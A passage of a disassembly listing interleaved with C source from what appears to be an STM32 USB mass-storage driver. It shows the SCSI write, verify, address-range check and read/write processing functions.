 800ab9a:	68f8      	ldr	r0, [r7, #12]
 800ab9c:	f7ff fc66 	bl	800a46c <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800aba0:	697b      	ldr	r3, [r7, #20]
 800aba2:	2205      	movs	r2, #5
 800aba4:	721a      	strb	r2, [r3, #8]
      return -1;
 800aba6:	f04f 33ff 	mov.w	r3, #4294967295
 800abaa:	e092      	b.n	800acd2 <SCSI_Write12+0x1da>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800abac:	68fb      	ldr	r3, [r7, #12]
 800abae:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800abb2:	68fa      	ldr	r2, [r7, #12]
 800abb4:	33b0      	adds	r3, #176	; 0xb0
 800abb6:	009b      	lsls	r3, r3, #2
 800abb8:	4413      	add	r3, r2
 800abba:	685b      	ldr	r3, [r3, #4]
 800abbc:	68db      	ldr	r3, [r3, #12]
 800abbe:	7afa      	ldrb	r2, [r7, #11]
 800abc0:	4610      	mov	r0, r2
 800abc2:	4798      	blx	r3
 800abc4:	4603      	mov	r3, r0
 800abc6:	2b00      	cmp	r3, #0
 800abc8:	d00b      	beq.n	800abe2 <SCSI_Write12+0xea>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800abca:	7af9      	ldrb	r1, [r7, #11]
 800abcc:	2327      	movs	r3, #39	; 0x27
 800abce:	2202      	movs	r2, #2
 800abd0:	68f8      	ldr	r0, [r7, #12]
 800abd2:	f7ff fc4b 	bl	800a46c <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800abd6:	697b      	ldr	r3, [r7, #20]
 800abd8:	2205      	movs	r2, #5
 800abda:	721a      	strb	r2, [r3, #8]
      return -1;
 800abdc:	f04f 33ff 	mov.w	r3, #4294967295
 800abe0:	e077      	b.n	800acd2 <SCSI_Write12+0x1da>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800abe2:	687b      	ldr	r3, [r7, #4]
 800abe4:	3302      	adds	r3, #2
 800abe6:	781b      	ldrb	r3, [r3, #0]
 800abe8:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800abea:	687b      	ldr	r3, [r7, #4]
 800abec:	3303      	adds	r3, #3
 800abee:	781b      	ldrb	r3, [r3, #0]
 800abf0:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800abf2:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800abf4:	687b      	ldr	r3, [r7, #4]
 800abf6:	3304      	adds	r3, #4
 800abf8:	781b      	ldrb	r3, [r3, #0]
 800abfa:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800abfc:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800abfe:	687a      	ldr	r2, [r7, #4]
 800ac00:	3205      	adds	r2, #5
 800ac02:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800ac04:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800ac06:	697a      	ldr	r2, [r7, #20]
 800ac08:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ac0c:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800ac0e:	687b      	ldr	r3, [r7, #4]
 800ac10:	3306      	adds	r3, #6
 800ac12:	781b      	ldrb	r3, [r3, #0]
 800ac14:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800ac16:	687b      	ldr	r3, [r7, #4]
 800ac18:	3307      	adds	r3, #7
 800ac1a:	781b      	ldrb	r3, [r3, #0]
 800ac1c:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800ac1e:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800ac20:	687b      	ldr	r3, [r7, #4]
 800ac22:	3308      	adds	r3, #8
 800ac24:	781b      	ldrb	r3, [r3, #0]
 800ac26:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800ac28:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800ac2a:	687a      	ldr	r2, [r7, #4]
 800ac2c:	3209      	adds	r2, #9
 800ac2e:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800ac30:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800ac32:	697a      	ldr	r2, [r7, #20]
 800ac34:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ac38:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800ac3a:	697b      	ldr	r3, [r7, #20]
 800ac3c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac40:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800ac42:	697b      	ldr	r3, [r7, #20]
 800ac44:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac48:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ac4a:	7af9      	ldrb	r1, [r7, #11]
 800ac4c:	68f8      	ldr	r0, [r7, #12]
 800ac4e:	f000 f886 	bl	800ad5e <SCSI_CheckAddressRange>
 800ac52:	4603      	mov	r3, r0
 800ac54:	2b00      	cmp	r3, #0
 800ac56:	da02      	bge.n	800ac5e <SCSI_Write12+0x166>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800ac58:	f04f 33ff 	mov.w	r3, #4294967295
 800ac5c:	e039      	b.n	800acd2 <SCSI_Write12+0x1da>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800ac5e:	697b      	ldr	r3, [r7, #20]
 800ac60:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac64:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ac66:	697a      	ldr	r2, [r7, #20]
 800ac68:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ac6c:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800ac70:	fb02 f303 	mul.w	r3, r2, r3
 800ac74:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800ac76:	697b      	ldr	r3, [r7, #20]
 800ac78:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac7c:	699b      	ldr	r3, [r3, #24]
 800ac7e:	693a      	ldr	r2, [r7, #16]
 800ac80:	429a      	cmp	r2, r3
 800ac82:	d00b      	beq.n	800ac9c <SCSI_Write12+0x1a4>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800ac84:	697b      	ldr	r3, [r7, #20]
 800ac86:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac8a:	7f59      	ldrb	r1, [r3, #29]
 800ac8c:	2320      	movs	r3, #32
 800ac8e:	2205      	movs	r2, #5
 800ac90:	68f8      	ldr	r0, [r7, #12]
 800ac92:	f7ff fbeb 	bl	800a46c <SCSI_SenseCode>
      return -1;
 800ac96:	f04f 33ff 	mov.w	r3, #4294967295
 800ac9a:	e01a      	b.n	800acd2 <SCSI_Write12+0x1da>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800ac9c:	693b      	ldr	r3, [r7, #16]
 800ac9e:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800aca2:	bf28      	it	cs
 800aca4:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800aca8:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800acaa:	697b      	ldr	r3, [r7, #20]
 800acac:	2201      	movs	r2, #1
 800acae:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800acb0:	4b0a      	ldr	r3, [pc, #40]	; (800acdc <SCSI_Write12+0x1e4>)
 800acb2:	7819      	ldrb	r1, [r3, #0]
 800acb4:	697b      	ldr	r3, [r7, #20]
 800acb6:	f103 0210 	add.w	r2, r3, #16
 800acba:	693b      	ldr	r3, [r7, #16]
 800acbc:	68f8      	ldr	r0, [r7, #12]
 800acbe:	f002 f9ff 	bl	800d0c0 <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800acc2:	2300      	movs	r3, #0
 800acc4:	e005      	b.n	800acd2 <SCSI_Write12+0x1da>
    return SCSI_ProcessWrite(pdev, lun);
 800acc6:	7afb      	ldrb	r3, [r7, #11]
 800acc8:	4619      	mov	r1, r3
 800acca:	68f8      	ldr	r0, [r7, #12]
 800accc:	f000 f90a 	bl	800aee4 <SCSI_ProcessWrite>
 800acd0:	4603      	mov	r3, r0
}
 800acd2:	4618      	mov	r0, r3
 800acd4:	3718      	adds	r7, #24
 800acd6:	46bd      	mov	sp, r7
 800acd8:	bd80      	pop	{r7, pc}
 800acda:	bf00      	nop
 800acdc:	2000010b 	.word	0x2000010b

0800ace0 <SCSI_Verify10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Verify10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800ace0:	b580      	push	{r7, lr}
 800ace2:	b086      	sub	sp, #24
 800ace4:	af00      	add	r7, sp, #0
 800ace6:	60f8      	str	r0, [r7, #12]
 800ace8:	460b      	mov	r3, r1
 800acea:	607a      	str	r2, [r7, #4]
 800acec:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800acee:	68fb      	ldr	r3, [r7, #12]
 800acf0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800acf4:	68fb      	ldr	r3, [r7, #12]
 800acf6:	32b0      	adds	r2, #176	; 0xb0
 800acf8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800acfc:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800acfe:	697b      	ldr	r3, [r7, #20]
 800ad00:	2b00      	cmp	r3, #0
 800ad02:	d102      	bne.n	800ad0a <SCSI_Verify10+0x2a>
  {
    return -1;
 800ad04:	f04f 33ff 	mov.w	r3, #4294967295
 800ad08:	e025      	b.n	800ad56 <SCSI_Verify10+0x76>
  }

  if ((params[1] & 0x02U) == 0x02U)
 800ad0a:	687b      	ldr	r3, [r7, #4]
 800ad0c:	3301      	adds	r3, #1
 800ad0e:	781b      	ldrb	r3, [r3, #0]
 800ad10:	f003 0302 	and.w	r3, r3, #2
 800ad14:	2b00      	cmp	r3, #0
 800ad16:	d008      	beq.n	800ad2a <SCSI_Verify10+0x4a>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800ad18:	7af9      	ldrb	r1, [r7, #11]
 800ad1a:	2324      	movs	r3, #36	; 0x24
 800ad1c:	2205      	movs	r2, #5
 800ad1e:	68f8      	ldr	r0, [r7, #12]
 800ad20:	f7ff fba4 	bl	800a46c <SCSI_SenseCode>
    return -1; /* Error, Verify Mode Not supported*/
 800ad24:	f04f 33ff 	mov.w	r3, #4294967295
 800ad28:	e015      	b.n	800ad56 <SCSI_Verify10+0x76>
  }

  if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr, hmsc->scsi_blk_len) < 0)
 800ad2a:	697b      	ldr	r3, [r7, #20]
 800ad2c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad30:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800ad32:	697b      	ldr	r3, [r7, #20]
 800ad34:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad38:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ad3a:	7af9      	ldrb	r1, [r7, #11]
 800ad3c:	68f8      	ldr	r0, [r7, #12]
 800ad3e:	f000 f80e 	bl	800ad5e <SCSI_CheckAddressRange>
 800ad42:	4603      	mov	r3, r0
 800ad44:	2b00      	cmp	r3, #0
 800ad46:	da02      	bge.n	800ad4e <SCSI_Verify10+0x6e>
  {
    return -1; /* error */
 800ad48:	f04f 33ff 	mov.w	r3, #4294967295
 800ad4c:	e003      	b.n	800ad56 <SCSI_Verify10+0x76>
  }

  hmsc->bot_data_length = 0U;
 800ad4e:	697b      	ldr	r3, [r7, #20]
 800ad50:	2200      	movs	r2, #0
 800ad52:	60da      	str	r2, [r3, #12]

  return 0;
 800ad54:	2300      	movs	r3, #0
}
 800ad56:	4618      	mov	r0, r3
 800ad58:	3718      	adds	r7, #24
 800ad5a:	46bd      	mov	sp, r7
 800ad5c:	bd80      	pop	{r7, pc}

0800ad5e <SCSI_CheckAddressRange>:
  * @param  blk_nbr: number of block to be processed
  * @retval status
  */
static int8_t SCSI_CheckAddressRange(USBD_HandleTypeDef *pdev, uint8_t lun,
                                     uint32_t blk_offset, uint32_t blk_nbr)
{
 800ad5e:	b580      	push	{r7, lr}
 800ad60:	b086      	sub	sp, #24
 800ad62:	af00      	add	r7, sp, #0
 800ad64:	60f8      	str	r0, [r7, #12]
 800ad66:	607a      	str	r2, [r7, #4]
 800ad68:	603b      	str	r3, [r7, #0]
 800ad6a:	460b      	mov	r3, r1
 800ad6c:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ad6e:	68fb      	ldr	r3, [r7, #12]
 800ad70:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ad74:	68fb      	ldr	r3, [r7, #12]
 800ad76:	32b0      	adds	r2, #176	; 0xb0
 800ad78:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ad7c:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800ad7e:	697b      	ldr	r3, [r7, #20]
 800ad80:	2b00      	cmp	r3, #0
 800ad82:	d102      	bne.n	800ad8a <SCSI_CheckAddressRange+0x2c>
  {
    return -1;
 800ad84:	f04f 33ff 	mov.w	r3, #4294967295
 800ad88:	e012      	b.n	800adb0 <SCSI_CheckAddressRange+0x52>
  }

  if ((blk_offset + blk_nbr) > hmsc->scsi_blk_nbr)
 800ad8a:	687a      	ldr	r2, [r7, #4]
 800ad8c:	683b      	ldr	r3, [r7, #0]
 800ad8e:	441a      	add	r2, r3
 800ad90:	697b      	ldr	r3, [r7, #20]
 800ad92:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad96:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800ad98:	429a      	cmp	r2, r3
 800ad9a:	d908      	bls.n	800adae <SCSI_CheckAddressRange+0x50>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, ADDRESS_OUT_OF_RANGE);
 800ad9c:	7af9      	ldrb	r1, [r7, #11]
 800ad9e:	2321      	movs	r3, #33	; 0x21
 800ada0:	2205      	movs	r2, #5
 800ada2:	68f8      	ldr	r0, [r7, #12]
 800ada4:	f7ff fb62 	bl	800a46c <SCSI_SenseCode>
    return -1;
 800ada8:	f04f 33ff 	mov.w	r3, #4294967295
 800adac:	e000      	b.n	800adb0 <SCSI_CheckAddressRange+0x52>
  }

  return 0;
 800adae:	2300      	movs	r3, #0
}
 800adb0:	4618      	mov	r0, r3
 800adb2:	3718      	adds	r7, #24
 800adb4:	46bd      	mov	sp, r7
 800adb6:	bd80      	pop	{r7, pc}

0800adb8 <SCSI_ProcessRead>:
  *         Handle Read Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessRead(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800adb8:	b590      	push	{r4, r7, lr}
 800adba:	b085      	sub	sp, #20
 800adbc:	af00      	add	r7, sp, #0
 800adbe:	6078      	str	r0, [r7, #4]
 800adc0:	460b      	mov	r3, r1
 800adc2:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800adc4:	687b      	ldr	r3, [r7, #4]
 800adc6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800adca:	687b      	ldr	r3, [r7, #4]
 800adcc:	32b0      	adds	r2, #176	; 0xb0
 800adce:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800add2:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800add4:	68fb      	ldr	r3, [r7, #12]
 800add6:	2b00      	cmp	r3, #0
 800add8:	d102      	bne.n	800ade0 <SCSI_ProcessRead+0x28>
  {
    return -1;
 800adda:	f04f 33ff 	mov.w	r3, #4294967295
 800adde:	e07b      	b.n	800aed8 <SCSI_ProcessRead+0x120>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800ade0:	68fb      	ldr	r3, [r7, #12]
 800ade2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ade6:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ade8:	68fa      	ldr	r2, [r7, #12]
 800adea:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800adee:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800adf2:	fb02 f303 	mul.w	r3, r2, r3
 800adf6:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800adf8:	68bb      	ldr	r3, [r7, #8]
 800adfa:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800adfe:	bf28      	it	cs
 800ae00:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800ae04:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800ae06:	687b      	ldr	r3, [r7, #4]
 800ae08:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800ae0c:	687a      	ldr	r2, [r7, #4]
 800ae0e:	33b0      	adds	r3, #176	; 0xb0
 800ae10:	009b      	lsls	r3, r3, #2
 800ae12:	4413      	add	r3, r2
 800ae14:	685b      	ldr	r3, [r3, #4]
 800ae16:	691c      	ldr	r4, [r3, #16]
 800ae18:	68fb      	ldr	r3, [r7, #12]
 800ae1a:	f103 0110 	add.w	r1, r3, #16
 800ae1e:	68fb      	ldr	r3, [r7, #12]
 800ae20:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ae24:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                    hmsc->scsi_blk_addr,
                                                                    (len / hmsc->scsi_blk_size)) < 0)
 800ae26:	68fb      	ldr	r3, [r7, #12]
 800ae28:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ae2c:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ae30:	4618      	mov	r0, r3
 800ae32:	68bb      	ldr	r3, [r7, #8]
 800ae34:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800ae38:	b29b      	uxth	r3, r3
 800ae3a:	78f8      	ldrb	r0, [r7, #3]
 800ae3c:	47a0      	blx	r4
 800ae3e:	4603      	mov	r3, r0
 800ae40:	2b00      	cmp	r3, #0
 800ae42:	da08      	bge.n	800ae56 <SCSI_ProcessRead+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, UNRECOVERED_READ_ERROR);
 800ae44:	78f9      	ldrb	r1, [r7, #3]
 800ae46:	2311      	movs	r3, #17
 800ae48:	2204      	movs	r2, #4
 800ae4a:	6878      	ldr	r0, [r7, #4]
 800ae4c:	f7ff fb0e 	bl	800a46c <SCSI_SenseCode>
    return -1;
 800ae50:	f04f 33ff 	mov.w	r3, #4294967295
 800ae54:	e040      	b.n	800aed8 <SCSI_ProcessRead+0x120>
  }

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, hmsc->bot_data, len);
 800ae56:	4b22      	ldr	r3, [pc, #136]	; (800aee0 <SCSI_ProcessRead+0x128>)
 800ae58:	7819      	ldrb	r1, [r3, #0]
 800ae5a:	68fb      	ldr	r3, [r7, #12]
 800ae5c:	f103 0210 	add.w	r2, r3, #16
 800ae60:	68bb      	ldr	r3, [r7, #8]
 800ae62:	6878      	ldr	r0, [r7, #4]
 800ae64:	f002 f8f4 	bl	800d050 <USBD_LL_Transmit>

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800ae68:	68fb      	ldr	r3, [r7, #12]
 800ae6a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ae6e:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800ae70:	68fb      	ldr	r3, [r7, #12]
 800ae72:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ae76:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ae7a:	4619      	mov	r1, r3
 800ae7c:	68bb      	ldr	r3, [r7, #8]
 800ae7e:	fbb3 f3f1 	udiv	r3, r3, r1
 800ae82:	4413      	add	r3, r2
 800ae84:	68fa      	ldr	r2, [r7, #12]
 800ae86:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ae8a:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800ae8c:	68fb      	ldr	r3, [r7, #12]
 800ae8e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ae92:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800ae94:	68fb      	ldr	r3, [r7, #12]
 800ae96:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ae9a:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ae9e:	4619      	mov	r1, r3
 800aea0:	68bb      	ldr	r3, [r7, #8]
 800aea2:	fbb3 f3f1 	udiv	r3, r3, r1
 800aea6:	1ad3      	subs	r3, r2, r3
 800aea8:	68fa      	ldr	r2, [r7, #12]
 800aeaa:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aeae:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 6 : Hi = Di */
  hmsc->csw.dDataResidue -= len;
 800aeb0:	68fb      	ldr	r3, [r7, #12]
 800aeb2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aeb6:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800aeb8:	68bb      	ldr	r3, [r7, #8]
 800aeba:	1ad3      	subs	r3, r2, r3
 800aebc:	68fa      	ldr	r2, [r7, #12]
 800aebe:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aec2:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800aec4:	68fb      	ldr	r3, [r7, #12]
 800aec6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aeca:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aecc:	2b00      	cmp	r3, #0
 800aece:	d102      	bne.n	800aed6 <SCSI_ProcessRead+0x11e>
  {
    hmsc->bot_state = USBD_BOT_LAST_DATA_IN;
 800aed0:	68fb      	ldr	r3, [r7, #12]
 800aed2:	2203      	movs	r2, #3
 800aed4:	721a      	strb	r2, [r3, #8]
  }

  return 0;
 800aed6:	2300      	movs	r3, #0
}
 800aed8:	4618      	mov	r0, r3
 800aeda:	3714      	adds	r7, #20
 800aedc:	46bd      	mov	sp, r7
 800aede:	bd90      	pop	{r4, r7, pc}
 800aee0:	2000010a 	.word	0x2000010a

0800aee4 <SCSI_ProcessWrite>:
  *         Handle Write Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessWrite(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800aee4:	b590      	push	{r4, r7, lr}
 800aee6:	b085      	sub	sp, #20
 800aee8:	af00      	add	r7, sp, #0
 800aeea:	6078      	str	r0, [r7, #4]
 800aeec:	460b      	mov	r3, r1
 800aeee:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800aef0:	687b      	ldr	r3, [r7, #4]
 800aef2:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800aef6:	687b      	ldr	r3, [r7, #4]
 800aef8:	32b0      	adds	r2, #176	; 0xb0
 800aefa:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800aefe:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800af00:	68fb      	ldr	r3, [r7, #12]
 800af02:	2b00      	cmp	r3, #0
 800af04:	d102      	bne.n	800af0c <SCSI_ProcessWrite+0x28>
  {
    return -1;
 800af06:	f04f 33ff 	mov.w	r3, #4294967295
 800af0a:	e08e      	b.n	800b02a <SCSI_ProcessWrite+0x146>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800af0c:	68fb      	ldr	r3, [r7, #12]
 800af0e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af12:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800af14:	68fa      	ldr	r2, [r7, #12]
 800af16:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800af1a:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800af1e:	fb02 f303 	mul.w	r3, r2, r3
 800af22:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800af24:	68bb      	ldr	r3, [r7, #8]
 800af26:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800af2a:	bf28      	it	cs
 800af2c:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800af30:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800af32:	687b      	ldr	r3, [r7, #4]
 800af34:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800af38:	687a      	ldr	r2, [r7, #4]
 800af3a:	33b0      	adds	r3, #176	; 0xb0
 800af3c:	009b      	lsls	r3, r3, #2
 800af3e:	4413      	add	r3, r2
 800af40:	685b      	ldr	r3, [r3, #4]
 800af42:	695c      	ldr	r4, [r3, #20]
 800af44:	68fb      	ldr	r3, [r7, #12]
 800af46:	f103 0110 	add.w	r1, r3, #16
 800af4a:	68fb      	ldr	r3, [r7, #12]
 800af4c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af50:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                     hmsc->scsi_blk_addr,
                                                                     (len / hmsc->scsi_blk_size)) < 0)
 800af52:	68fb      	ldr	r3, [r7, #12]
 800af54:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af58:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800af5c:	4618      	mov	r0, r3
 800af5e:	68bb      	ldr	r3, [r7, #8]
 800af60:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800af64:	b29b      	uxth	r3, r3
 800af66:	78f8      	ldrb	r0, [r7, #3]
 800af68:	47a0      	blx	r4
 800af6a:	4603      	mov	r3, r0
 800af6c:	2b00      	cmp	r3, #0
 800af6e:	da08      	bge.n	800af82 <SCSI_ProcessWrite+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, WRITE_FAULT);
 800af70:	78f9      	ldrb	r1, [r7, #3]
 800af72:	2303      	movs	r3, #3
 800af74:	2204      	movs	r2, #4
 800af76:	6878      	ldr	r0, [r7, #4]
 800af78:	f7ff fa78 	bl	800a46c <SCSI_SenseCode>
    return -1;
 800af7c:	f04f 33ff 	mov.w	r3, #4294967295
 800af80:	e053      	b.n	800b02a <SCSI_ProcessWrite+0x146>
  }

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800af82:	68fb      	ldr	r3, [r7, #12]
 800af84:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af88:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800af8a:	68fb      	ldr	r3, [r7, #12]
 800af8c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af90:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800af94:	4619      	mov	r1, r3
 800af96:	68bb      	ldr	r3, [r7, #8]
 800af98:	fbb3 f3f1 	udiv	r3, r3, r1
 800af9c:	4413      	add	r3, r2
 800af9e:	68fa      	ldr	r2, [r7, #12]
 800afa0:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
